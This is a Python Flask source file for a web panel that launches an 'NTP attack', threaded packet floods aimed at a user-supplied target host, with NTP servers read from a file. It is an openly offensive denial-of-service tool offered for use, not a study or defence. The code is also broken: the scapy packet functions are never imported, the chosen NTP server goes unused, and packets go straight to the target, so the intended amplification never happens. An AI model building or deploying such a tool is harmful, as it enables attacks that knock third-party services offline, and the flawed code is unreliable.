from flask import Flask, request, jsonify, render_template
import os
import random
import socket
import threading

app = Flask(__name__)

def read_ntp_servers():
    """Read NTP servers from a file."""
    ntp_servers = []
    with open('ntp.txt', 'r') as file:
        for line in file:
            parts = line.split()
            if len(parts) >= 1:
                ntp_servers.append(parts[0])  # Only take the IP address
    return ntp_servers

ntp_servers = read_ntp_servers()

def check_tgt(target):
    """Resolve the target hostname to an IP address."""
    try:
        ip = socket.gethostbyname(target)
        return ip
    except socket.gaierror:
        return None

class NTPAttack:
    def __init__(self, tgt, threads):
        self.tgt = tgt
        self.threads = threads

    def send_ntp_request(self, ntp_server):
        """Send an NTP request to the target."""
        packet = IP(dst=self.tgt) / UDP(dport=123) / Raw(load="\x1b" + 47 * "\0")
        send(packet, verbose=False)

    def start_attack(self):
        """Start the NTP attack using multiple threads."""
        threads = []
        for _ in range(self.threads):
            ntp_server = random.choice(ntp_servers)  # Randomly choose an NTP server
            t = threading.Thread(target=self.send_ntp_request, args=(ntp_server,))
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/attack', methods=['POST'])
def attack():
    target = request.form['target']
    threads = int(request.form.get('threads', 100))

    tgt = check_tgt(target)
    if tgt is None:
        return jsonify({"error": f"Can't resolve host: {target}!"}), 400

    attack = NTPAttack(tgt, threads)
    attack.start_attack()
    
    return jsonify({"message": f"Started attack on {tgt} with {threads} threads."})

if __name__ == '__main__':
    app.run(debug=True)
